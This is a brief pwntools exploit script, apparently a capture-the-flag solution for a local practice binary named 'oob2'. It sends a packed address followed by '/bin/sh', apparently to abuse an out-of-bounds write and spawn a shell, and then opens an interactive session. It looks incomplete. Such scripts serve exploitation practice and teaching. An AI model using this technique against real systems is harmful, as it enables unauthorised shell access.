from pwn import *

p = process('./oob2')

p.recvuntil("name? : ")

payload = p64(0x4040d0+8)
payload += "/bin/sh\x00"

p.sendline(payload)

# menu 10

p.interactive()